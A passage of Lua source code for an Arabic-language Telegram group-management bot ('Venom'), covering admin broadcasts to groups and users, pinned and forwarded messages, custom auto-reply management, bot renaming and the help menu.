local VenomTEAM = '𖠧︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n𖠧︙ارسل لي سواء ↫ ⤈ \n❨ ملف • ملصق • متحركه • صوره\n • فيديو • بصمه • صوت • رساله ❩\n𖠧︙للخروج ارسل ↫ ( الغاء ) \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, VenomTEAM, 14, string.len(msg.sender_user_id_))
return false
end 
if DevAbs:get(Venom.."Abs:Send:Gp"..msg.chat_id_..":" .. msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙تم الغاء امر الاذاعه بنجاح", 1, 'md')
DevAbs:del(Venom.."Abs:Send:Gp"..msg.chat_id_..":" .. msg.sender_user_id_) 
return false
end 
List = DevAbs:smembers(Venom..'Abs:Groups') 
if msg.content_.text_ then
for k,v in pairs(List) do 
AbsText = "الرساله"
send(v, 0,"["..msg.content_.text_.."]") 
end
elseif msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
elseif msg.content_.photo_.sizes_[1] then
photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
for k,v in pairs(List) do 
AbsText = "الصوره"
sendPhoto(v, 0, 0, 1, nil, photo,(msg.content_.caption_ or ''))
end 
elseif msg.content_.animation_ then
for k,v in pairs(List) do 
AbsText = "المتحركه"
sendDocument(v, 0, 0, 1,nil, msg.content_.animation_.animation_.persistent_id_,(msg.content_.caption_ or ''))    
end 
elseif msg.content_.video_ then
for k,v in pairs(List) do 
AbsText = "الفيديو"
sendVideo(v, 0, 0, 1, nil, msg.content_.video_.video_.persistent_id_,(msg.content_.caption_ or '')) 
end 
elseif msg.content_.voice_ then
for k,v in pairs(List) do 
AbsText = "البصمه"
sendVoice(v, 0, 0, 1, nil, msg.content_.voice_.voice_.persistent_id_,(msg.content_.caption_ or '')) 
end 
elseif msg.content_.audio_ then
for k,v in pairs(List) do 
AbsText = "الصوت"
sendAudio(v, 0, 0, 1, nil, msg.content_.audio_.audio_.persistent_id_,(msg.content_.caption_ or '')) 
end 
elseif msg.content_.document_ then
for k,v in pairs(List) do 
AbsText = "الملف"
sendDocument(v, 0, 0, 1,nil, msg.content_.document_.document_.persistent_id_,(msg.content_.caption_ or ''))    
end 
elseif msg.content_.sticker_ then
for k,v in pairs(List) do 
AbsText = "الملصق"
sendSticker(v, 0, 0, 1, nil, msg.content_.sticker_.sticker_.persistent_id_)   
end 
end
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙تم اذاعة "..AbsText.." بنجاح \n𖠧︙‏في ↫ ❨ "..#List.." ❩ مجموعه \n ✓", 1, 'md')
DevAbs:del(Venom.."Abs:Send:Gp"..msg.chat_id_..":" .. msg.sender_user_id_) 
end
--     Source Venom     --
if text == "اذاعه بالتوجيه" and msg.reply_to_message_id_ == 0 and SudoBot(msg) or text == "↫ اذاعه عام بالتوجيه 𖠧" and msg.reply_to_message_id_ == 0 and SudoBot(msg) then 
if DevAbs:get(Venom.."Abs:Send:Bot"..Venom) and not SecondSudo(msg) then 
send(msg.chat_id_, msg.id_,"𖠧︙الاذاعه معطله من قبل المطور الاساسي")
return false
end
DevAbs:setex(Venom.."Abs:Send:FwdGp"..msg.chat_id_..":" .. msg.sender_user_id_, 600, true) 
local VenomTEAM = '𖠧︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n𖠧︙ارسل الرساله الان لتوجيها \n𖠧︙للخروج ارسل ↫ ( الغاء ) \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, VenomTEAM, 14, string.len(msg.sender_user_id_))
return false
end 
if DevAbs:get(Venom.."Abs:Send:FwdGp"..msg.chat_id_..":" .. msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙تم الغاء امر الاذاعه بنجاح", 1, 'md')
DevAbs:del(Venom.."Abs:Send:FwdGp"..msg.chat_id_..":" .. msg.sender_user_id_) 
return false  
end 
local List = DevAbs:smembers(Venom..'Abs:Groups')   
for k,v in pairs(List) do  
tdcli_function({ID="ForwardMessages", chat_id_ = v, from_chat_id_ = msg.chat_id_, message_ids_ = {[0] = msg.id_}, disable_notification_ = 0, from_background_ = 1},function(a,t) end,nil) 
end   
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙تم اذاعة رسالتك بالتوجيه \n𖠧︙‏في ↫ ❨ "..#List.." ❩ مجموعه \n ✓", 1, 'md')
DevAbs:del(Venom.."Abs:Send:FwdGp"..msg.chat_id_..":" .. msg.sender_user_id_) 
end
--     Source Venom     --
if text == "اذاعه خاص بالتوجيه" and msg.reply_to_message_id_ == 0 and SudoBot(msg) or text == "↫ اذاعه خاص بالتوجيه 𖠧" and msg.reply_to_message_id_ == 0 and SudoBot(msg) then 
if DevAbs:get(Venom.."Abs:Send:Bot"..Venom) and not SecondSudo(msg) then 
send(msg.chat_id_, msg.id_,"𖠧︙الاذاعه معطله من قبل المطور الاساسي")
return false
end
DevAbs:setex(Venom.."Abs:Send:FwdPv"..msg.chat_id_..":" .. msg.sender_user_id_, 600, true) 
local VenomTEAM = '𖠧︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n𖠧︙ارسل الرساله الان لتوجيها \n𖠧︙للخروج ارسل ↫ ( الغاء ) \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, VenomTEAM, 14, string.len(msg.sender_user_id_))
return false
end 
if DevAbs:get(Venom.."Abs:Send:FwdPv"..msg.chat_id_..":" .. msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙تم الغاء امر الاذاعه بنجاح", 1, 'md')
DevAbs:del(Venom.."Abs:Send:FwdPv"..msg.chat_id_..":" .. msg.sender_user_id_) 
return false  
end 
local List = DevAbs:smembers(Venom..'Abs:Users')   
for k,v in pairs(List) do  
tdcli_function({ID="ForwardMessages", chat_id_ = v, from_chat_id_ = msg.chat_id_, message_ids_ = {[0] = msg.id_}, disable_notification_ = 0, from_background_ = 1},function(a,t) end,nil) 
end   
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙تم اذاعة رسالتك بالتوجيه \n𖠧︙‏الى ↫ ❨ "..#List.." ❩ مشترك \n ✓", 1, 'md')
DevAbs:del(Venom.."Abs:Send:FwdPv"..msg.chat_id_..":" .. msg.sender_user_id_) 
end
--     Source Venom     --
if text == "اذاعه بالتثبيت" and msg.reply_to_message_id_ == 0 and SudoBot(msg) or text == "↫ اذاعه بالتثبيت 𖠧" and msg.reply_to_message_id_ == 0 and SudoBot(msg) then 
if DevAbs:get(Venom.."Abs:Send:Bot"..Venom) and not SecondSudo(msg) then 
send(msg.chat_id_, msg.id_,"𖠧︙الاذاعه معطله من قبل المطور الاساسي")
return false
end
DevAbs:setex(Venom.."Abs:Send:Gp:Pin"..msg.chat_id_..":" .. msg.sender_user_id_, 600, true) 
local VenomTEAM = '𖠧︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n𖠧︙ارسل لي سواء ↫ ⤈ \n❨ ملف • ملصق • متحركه • صوره\n • فيديو • بصمه • صوت • رساله ❩\n𖠧︙للخروج ارسل ↫ ( الغاء ) \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, VenomTEAM, 14, string.len(msg.sender_user_id_))
return false
end 
if DevAbs:get(Venom.."Abs:Send:Gp:Pin"..msg.chat_id_..":" .. msg.sender_user_id_) then 
if text == "الغاء" then   
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙تم الغاء امر الاذاعه بنجاح", 1, 'md')
DevAbs:del(Venom.."Abs:Send:Gp:Pin"..msg.chat_id_..":" .. msg.sender_user_id_) 
return false
end 
local List = DevAbs:smembers(Venom.."Abs:Groups") 
if msg.content_.text_ then
for k,v in pairs(List) do 
AbsText = "الرساله"
send(v, 0,"["..msg.content_.text_.."]") 
DevAbs:set(Venom..'Abs:PinnedMsgs'..v,msg.content_.text_) 
end
elseif msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
elseif msg.content_.photo_.sizes_[1] then
photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
for k,v in pairs(List) do 
AbsText = "الصوره"
sendPhoto(v, 0, 0, 1, nil, photo,(msg.content_.caption_ or ''))
DevAbs:set(Venom..'Abs:PinnedMsgs'..v,photo) 
end 
elseif msg.content_.animation_ then
for k,v in pairs(List) do 
AbsText = "المتحركه"
sendDocument(v, 0, 0, 1,nil, msg.content_.animation_.animation_.persistent_id_,(msg.content_.caption_ or ''))    
DevAbs:set(Venom..'Abs:PinnedMsgs'..v,msg.content_.animation_.animation_.persistent_id_)
end 
elseif msg.content_.video_ then
for k,v in pairs(List) do 
AbsText = "الفيديو"
sendVideo(v, 0, 0, 1, nil, msg.content_.video_.video_.persistent_id_,(msg.content_.caption_ or '')) 
DevAbs:set(Venom..'Abs:PinnedMsgs'..v,msg.content_.video_.video_.persistent_id_)
end 
elseif msg.content_.voice_ then
for k,v in pairs(List) do 
AbsText = "البصمه"
sendVoice(v, 0, 0, 1, nil, msg.content_.voice_.voice_.persistent_id_,(msg.content_.caption_ or '')) 
DevAbs:set(Venom..'Abs:PinnedMsgs'..v,msg.content_.voice_.voice_.persistent_id_)
end 
elseif msg.content_.audio_ then
for k,v in pairs(List) do 
AbsText = "الصوت"
sendAudio(v, 0, 0, 1, nil, msg.content_.audio_.audio_.persistent_id_,(msg.content_.caption_ or '')) 
DevAbs:set(Venom..'Abs:PinnedMsgs'..v,msg.content_.audio_.audio_.persistent_id_)
end 
elseif msg.content_.document_ then
for k,v in pairs(List) do 
AbsText = "الملف"
sendDocument(v, 0, 0, 1,nil, msg.content_.document_.document_.persistent_id_,(msg.content_.caption_ or ''))    
DevAbs:set(Venom..'Abs:PinnedMsgs'..v,msg.content_.document_.document_.persistent_id_)
end 
elseif msg.content_.sticker_ then
for k,v in pairs(List) do 
AbsText = "الملصق"
sendSticker(v, 0, 0, 1, nil, msg.content_.sticker_.sticker_.persistent_id_)   
DevAbs:set(Venom..'Abs:PinnedMsgs'..v,msg.content_.sticker_.sticker_.persistent_id_) 
end 
end
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙تم اذاعة "..AbsText.." بالتثبيت \n𖠧︙‏في ↫ ❨ "..#List.." ❩ مجموعه \n ✓", 1, 'md')
DevAbs:del(Venom.."Abs:Send:Gp:Pin"..msg.chat_id_..":" .. msg.sender_user_id_) 
return false
end
--     Source Venom     --
if text == 'حذف رد من متعدد' and Manager(msg) and ChCheck(msg) or text == 'مسح رد من متعدد' and Manager(msg) and ChCheck(msg) then
local List = DevAbs:smembers(Venom..'Abs:Manager:GpRedod'..msg.chat_id_)
if #List == 0 then
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙لا توجد ردود متعدده مضافه" ,  1, "md")
return false
end
DevAbs:set(Venom..'Abs:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_,'DelGpRedRedod')
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙حسنا ارسل كلمة الرد اولا" ,  1, "md")
return false
end
if text and text:match("^(.*)$") then
local DelGpRedRedod = DevAbs:get(Venom..'Abs:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
if DelGpRedRedod == 'DelGpRedRedod' then
if text == "الغاء" then 
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙تم الغاء الامر" ,  1, "md")
DevAbs:del(Venom..'Abs:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
return false
end
if not DevAbs:sismember(Venom..'Abs:Manager:GpRedod'..msg.chat_id_,text) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙لايوجد رد متعدد لهذه الكلمه ↫ "..text ,  1, "md")
return false
end
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙قم بارسال الرد المتعدد الذي تريد حذفه من الكلمه ↫ "..text ,  1, "md")
DevAbs:set(Venom..'Abs:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_,'DelGpRedRedods')
DevAbs:set(Venom..'Abs:Add:GpTexts'..msg.sender_user_id_..msg.chat_id_,text)
return false
end end
if text == 'حذف رد متعدد' and Manager(msg) and ChCheck(msg) or text == 'مسح رد متعدد' and Manager(msg) and ChCheck(msg) then
local List = DevAbs:smembers(Venom..'Abs:Manager:GpRedod'..msg.chat_id_)
if #List == 0 then
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙لا توجد ردود متعدده مضافه" ,  1, "md")
return false
end
DevAbs:set(Venom..'Abs:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_,'DelGpRedod')
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙حسنا ارسل الكلمه لحذفها" ,  1, "md")
return false
end
if text == 'اضف رد متعدد' and Manager(msg) and ChCheck(msg) then
DevAbs:set(Venom..'Abs:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_,'SetGpRedod')
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙حسنا ارسل الكلمه الان" ,  1, "md")
return false
end
if text and text:match("^(.*)$") then
local SetGpRedod = DevAbs:get(Venom..'Abs:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
if SetGpRedod == 'SetGpRedod' then
if text == "الغاء" then 
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙تم الغاء الامر" ,  1, "md")
DevAbs:del(Venom..'Abs:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
return false
end
if DevAbs:sismember(Venom..'Abs:Manager:GpRedod'..msg.chat_id_,text) then
local Abs = "𖠧︙لاتستطيع اضافة رد بالتاكيد مضاف في القائمه قم بحذفه اولا !"
keyboard = {} 
keyboard.inline_keyboard = {{{text="حذف الرد ↫ "..text,callback_data="/DelRed:"..msg.sender_user_id_..text}}} 
Msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(Abs).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
DevAbs:del(Venom..'Abs:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
return false
end
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙تم حفظ الامر ارسل الرد الاول\n𖠧︙للخروج ارسل ↫ ( الغاء )" ,  1, "md")
DevAbs:set(Venom..'Abs:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_,'SaveGpRedod')
DevAbs:set(Venom..'Abs:Add:GpTexts'..msg.sender_user_id_..msg.chat_id_,text)
DevAbs:sadd(Venom..'Abs:Manager:GpRedod'..msg.chat_id_,text)
return false
end end
--     Source Venom     --
if text == 'حذف رد' and Manager(msg) and ChCheck(msg) or text == 'مسح رد' and  Manager(msg) and ChCheck(msg) then
local List = DevAbs:smembers(Venom..'Abs:Manager:GpRed'..msg.chat_id_)
if #List == 0 then
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙لا توجد ردود مضافه" ,  1, "md")
return false
end
DevAbs:set(Venom..'Abs:Add:GpRed'..msg.sender_user_id_..msg.chat_id_,'DelGpRed')
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙حسنا ارسل الكلمه لحذفها " ,  1, "md")
return false
end
if text == 'اضف رد' and Manager(msg) and ChCheck(msg) then
DevAbs:set(Venom..'Abs:Add:GpRed'..msg.sender_user_id_..msg.chat_id_,'SetGpRed')
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙حسنا ارسل الكلمه الان " ,  1, "md")
return false
end
if text and text:match("^(.*)$") then
local SetGpRed = DevAbs:get(Venom..'Abs:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
if SetGpRed == 'SetGpRed' then
if text == "الغاء" then 
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙تم الغاء الامر" ,  1, "md")
DevAbs:del(Venom..'Abs:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
return false
end
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙ارسل لي الرد سواء كان ↫ ⤈\n❨ ملف • ملصق • متحركه • صوره\n • فيديو • بصمه • صوت • رساله ❩\n𖠧︙يمكنك اضافة الى النص ↫ ⤈\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n `#username` ↬ معرف المستخدم\n `#msgs` ↬ عدد الرسائل\n `#name` ↬ اسم المستخدم\n `#id` ↬ ايدي المستخدم\n `#stast` ↬ رتبة المستخدم\n `#edit` ↬ عدد السحكات\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n𖠧︙للخروج ارسل ↫ ( الغاء )\n ✓" ,  1, "md")
DevAbs:set(Venom..'Abs:Add:GpRed'..msg.sender_user_id_..msg.chat_id_,'SaveGpRed')
DevAbs:set(Venom..'Abs:Add:GpText'..msg.sender_user_id_..msg.chat_id_,text)
DevAbs:sadd(Venom..'Abs:Manager:GpRed'..msg.chat_id_,text)
DevAbs:set(Venom..'DelManagerRep'..msg.chat_id_,text)
return false
end end
--     Source Venom     --
if text == 'حذف رد عام' and SecondSudo(msg) or text == '↫ حذف رد عام 𖠧' and SecondSudo(msg) or text == 'مسح رد عام' and SecondSudo(msg) then
local List = DevAbs:smembers(Venom.."Abs:Sudo:AllRed")
if #List == 0 then
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙لا توجد ردود مضافه" ,  1, "md")
return false
end
DevAbs:set(Venom.."Abs:Add:AllRed"..msg.sender_user_id_,'DelAllRed')
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙حسنا ارسل الكلمه لحذفها " ,  1, "md")
return false
end
if text == 'اضف رد عام' and SecondSudo(msg) or text == '↫ اضف رد عام 𖠧' and SecondSudo(msg) then
DevAbs:set(Venom.."Abs:Add:AllRed"..msg.sender_user_id_,'SetAllRed')
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙حسنا ارسل الكلمه الان " ,  1, "md")
return false
end
if text and text:match("^(.*)$") then
local SetAllRed = DevAbs:get(Venom.."Abs:Add:AllRed"..msg.sender_user_id_)
if SetAllRed == 'SetAllRed' then
if text == "الغاء" then 
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙تم الغاء الامر" ,  1, "md")
DevAbs:del(Venom..'Abs:Add:AllRed'..msg.sender_user_id_)
return false
end
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙ارسل لي الرد سواء كان ↫ ⤈\n❨ ملف • ملصق • متحركه • صوره\n • فيديو • بصمه • صوت • رساله ❩\n𖠧︙يمكنك اضافة الى النص ↫ ⤈\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n `#username` ↬ معرف المستخدم\n `#msgs` ↬ عدد الرسائل\n `#name` ↬ اسم المستخدم\n `#id` ↬ ايدي المستخدم\n `#stast` ↬ رتبة المستخدم\n `#edit` ↬ عدد السحكات\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n𖠧︙للخروج ارسل ↫ ( الغاء )\n ✓" ,  1, "md")
DevAbs:set(Venom.."Abs:Add:AllRed"..msg.sender_user_id_,'SaveAllRed')
DevAbs:set(Venom.."Abs:Add:AllText"..msg.sender_user_id_, text)
DevAbs:sadd(Venom.."Abs:Sudo:AllRed",text)
DevAbs:set(Venom.."DelSudoRep",text)
return false 
end end
--     Source Venom     --
if text == 'الردود المتعدده' and Manager(msg) and ChCheck(msg) then
local redod = DevAbs:smembers(Venom..'Abs:Manager:GpRedod'..msg.chat_id_)
MsgRep = '𖠧︙قائمة الردود المتعدده ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n'
for k,v in pairs(redod) do
MsgRep = MsgRep..k..'~ (`'..v..'`) • {*العدد ↫ '..#DevAbs:smembers(Venom..'Abs:Text:GpTexts'..v..msg.chat_id_)..'*}\n' 
end
if #redod == 0 then
MsgRep = '𖠧︙لا توجد ردود متعدده مضافه'
end
send(msg.chat_id_,msg.id_,MsgRep)
end
if text == 'حذف الردود المتعدده' and Manager(msg) and ChCheck(msg) or text == 'مسح الردود المتعدده' and Manager(msg) and ChCheck(msg) then
local redod = DevAbs:smembers(Venom..'Abs:Manager:GpRedod'..msg.chat_id_)
if #redod == 0 then
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙لا توجد ردود متعدده مضافه" ,  1, "md")
else
for k,v in pairs(redod) do
DevAbs:del(Venom..'Abs:Text:GpTexts'..v..msg.chat_id_)
DevAbs:del(Venom..'Abs:Manager:GpRedod'..msg.chat_id_)
end
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","𖠧︙تم حذف الردود المتعدده")  
return false
end
end
--     Source Venom     --
if text == 'الردود' and Manager(msg) and ChCheck(msg) or text == 'ردود المدير' and Manager(msg) and ChCheck(msg) then
local redod = DevAbs:smembers(Venom..'Abs:Manager:GpRed'..msg.chat_id_)
MsgRep = '𖠧︙ردود المدير ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n'
for k,v in pairs(redod) do
if DevAbs:get(Venom.."Abs:Gif:GpRed"..v..msg.chat_id_) then
dp = 'متحركه 🎭'
elseif DevAbs:get(Venom.."Abs:Voice:GpRed"..v..msg.chat_id_) then
dp = 'بصمه 🎙'
elseif DevAbs:get(Venom.."Abs:Stecker:GpRed"..v..msg.chat_id_) then
dp = 'ملصق 🃏'
elseif DevAbs:get(Venom.."Abs:Text:GpRed"..v..msg.chat_id_) then
dp = 'رساله ✉'
elseif DevAbs:get(Venom.."Abs:Photo:GpRed"..v..msg.chat_id_) then
dp = 'صوره 🎇'
elseif DevAbs:get(Venom.."Abs:Video:GpRed"..v..msg.chat_id_) then
dp = 'فيديو 📽'
elseif DevAbs:get(Venom.."Abs:File:GpRed"..v..msg.chat_id_) then
dp = 'ملف 📁'
elseif DevAbs:get(Venom.."Abs:Audio:GpRed"..v..msg.chat_id_) then
dp = 'اغنيه 🎶'
end
MsgRep = MsgRep..k..'~ (`'..v..'`) ↫ {*'..dp..'*}\n' 
end
if #redod == 0 then
MsgRep = '𖠧︙لا توجد ردود مضافه'
end
send(msg.chat_id_,msg.id_,MsgRep)
end
if text == 'حذف الردود' and Manager(msg) and ChCheck(msg) or text == 'مسح الردود' and Manager(msg) and ChCheck(msg) or text == 'حذف ردود المدير' and Manager(msg) and ChCheck(msg) or text == 'مسح ردود المدير' and Manager(msg) and ChCheck(msg) then
local redod = DevAbs:smembers(Venom..'Abs:Manager:GpRed'..msg.chat_id_)
if #redod == 0 then
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙لا توجد ردود مضافه" ,  1, "md")
else
for k,v in pairs(redod) do
DevAbs:del(Venom..'Abs:Gif:GpRed'..v..msg.chat_id_)
DevAbs:del(Venom..'Abs:Voice:GpRed'..v..msg.chat_id_)
DevAbs:del(Venom..'Abs:Audio:GpRed'..v..msg.chat_id_)
DevAbs:del(Venom..'Abs:Photo:GpRed'..v..msg.chat_id_)
DevAbs:del(Venom..'Abs:Stecker:GpRed'..v..msg.chat_id_)
DevAbs:del(Venom..'Abs:Video:GpRed'..v..msg.chat_id_)
DevAbs:del(Venom..'Abs:File:GpRed'..v..msg.chat_id_)
DevAbs:del(Venom..'Abs:Text:GpRed'..v..msg.chat_id_)
DevAbs:del(Venom..'Abs:Manager:GpRed'..msg.chat_id_)
end
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","𖠧︙تم حذف ردود المدير")  
return false
end
end
--     Source Venom     --
if  text == "ردود المطور" and SecondSudo(msg) or text == "الردود العام" and SecondSudo(msg) or text == "ردود العام" and SecondSudo(msg) or text == "↫ الردود العام 𖠧" and SecondSudo(msg) then
local redod = DevAbs:smembers(Venom.."Abs:Sudo:AllRed")
MsgRep = '𖠧︙ردود المطور ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n'
for k,v in pairs(redod) do
if DevAbs:get(Venom.."Abs:Gif:AllRed"..v) then
dp = 'متحركه 🎭'
elseif DevAbs:get(Venom.."Abs:Voice:AllRed"..v) then
dp = 'بصمه 🎙'
elseif DevAbs:get(Venom.."Abs:Stecker:AllRed"..v) then
dp = 'ملصق 🃏'
elseif DevAbs:get(Venom.."Abs:Text:AllRed"..v) then
dp = 'رساله ✉'
elseif DevAbs:get(Venom.."Abs:Photo:AllRed"..v) then
dp = 'صوره 🎇'
elseif DevAbs:get(Venom.."Abs:Video:AllRed"..v) then
dp = 'فيديو 📽'
elseif DevAbs:get(Venom.."Abs:File:AllRed"..v) then
dp = 'ملف 📁'
elseif DevAbs:get(Venom.."Abs:Audio:AllRed"..v) then
dp = 'اغنيه 🎶'
end
MsgRep = MsgRep..k..'~ (`'..v..'`) ↫ {*'..dp..'*}\n' 
end
if #redod == 0 then
MsgRep = '𖠧︙لا توجد ردود مضافه'
end
send(msg.chat_id_,msg.id_,MsgRep)
end
if text == "حذف ردود المطور" and SecondSudo(msg) or text == "حذف ردود العام" and SecondSudo(msg) or text == "مسح ردود المطور" and SecondSudo(msg) then
local redod = DevAbs:smembers(Venom.."Abs:Sudo:AllRed")
if #redod == 0 then
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙لا توجد ردود مضافه" ,  1, "md")
else
for k,v in pairs(redod) do
DevAbs:del(Venom.."Abs:Add:AllRed"..v)
DevAbs:del(Venom.."Abs:Gif:AllRed"..v)
DevAbs:del(Venom.."Abs:Voice:AllRed"..v)
DevAbs:del(Venom.."Abs:Audio:AllRed"..v)
DevAbs:del(Venom.."Abs:Photo:AllRed"..v)
DevAbs:del(Venom.."Abs:Stecker:AllRed"..v)
DevAbs:del(Venom.."Abs:Video:AllRed"..v)
DevAbs:del(Venom.."Abs:File:AllRed"..v)
DevAbs:del(Venom.."Abs:Text:AllRed"..v)
DevAbs:del(Venom.."Abs:Sudo:AllRed")
end
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","𖠧︙تم حذف ردود المطور")  
return false
end
end 
--     Source Venom     --
if text and text == "تغيير اسم البوت" or text and text == "وضع اسم البوت" or text and text == "تغير اسم البوت" then
if not SecondSudo(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙للمطور الاساسي فقط ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙ارسل لي اسم البوت الان" ,  1, "md") 
DevAbs:set(Venom..'Abs:NameBot'..msg.sender_user_id_, 'msg')
return false 
end
end
if text and text == 'حذف اسم البوت' or text == 'مسح اسم البوت' then
if not SecondSudo(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙للمطور الاساسي فقط ', 1, 'md')
else
DevAbs:del(Venom..'Abs:NameBot')
local VenomTEAM = '𖠧︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n𖠧︙تم حذف اسم البوت'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, VenomTEAM, 14, string.len(msg.sender_user_id_))
end end 
--     Source Venom     --
if text and text:match("^استعاده الاوامر$") and SecondSudo(msg) or text and text:match("^استعادة كلايش الاوامر$") and SecondSudo(msg) then
HelpList ={'Abs:Help','Abs:Help1','Abs:Help2','Abs:Help3','Abs:Help4','Abs:Help5','Abs:Help6'}
for i,Help in pairs(HelpList) do
DevAbs:del(Venom..Help) 
end
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙تم استعادة الكلايش الاصليه" ,  1, "md") 
end
if text == "تعيين الاوامر" and SecondSudo(msg) or text == "تعيين امر الاوامر" and SecondSudo(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙ارسل كليشة (الاوامر) الان " ,  1, "md")
DevAbs:set(Venom..'Abs:Help0'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local VenomTEAM =  DevAbs:get(Venom..'Abs:Help0'..msg.sender_user_id_)
if VenomTEAM == 'msg' then
Dev_Abs(msg.chat_id_, msg.id_, 1, text , 1, 'md')
DevAbs:del(Venom..'Abs:Help0'..msg.sender_user_id_)
DevAbs:set(Venom..'Abs:Help', text)
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙تم حفظ الكليشه الجديده " ,  1, "md")
return false end
end
if text == "الاوامر" or text == "اوامر" or text == "مساعده" then
local Help = DevAbs:get(Venom..'Abs:Help')
local Text = [[
𖠧︙اهلا بك في قائمة الاوامر ↫ ⤈ 
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
𖠧︙م1 ↫ اوامر الحمايه
𖠧︙م2 ↫ اوامر الادمنيه
𖠧︙م3 ↫ اوامر المدراء
𖠧︙م4 ↫ اوامر المنشئين
𖠧︙م5 ↫ اوامر المطورين
𖠧︙م6 ↫ اوامر الاعضاء
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
𖠧︙[Source Channel](https://t.me/venom_source)
]] 
keyboard = {} 
keyboard.inline_keyboard = {{{text="اوامر الادمنيه",callback_data="/HelpList2:"..msg.sender_user_id_},{text="اوامر الحمايه",callback_data="/HelpList1:"..msg.sender_user_id_}},{{text="اوامر المنشئين",callback_data="/HelpList4:"..msg.sender_user_id_},{text="اوامر المدراء",callback_data="/HelpList3:"..msg.sender_user_id_}},{{text="اوامر الاعضاء",callback_data="/HelpList6:"..msg.sender_user_id_},{text="اوامر المطورين",callback_data="/HelpList5:"..msg.sender_user_id_}},{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..msg.sender_user_id_}}}
Msg_id = msg.id_/2097152/0.5
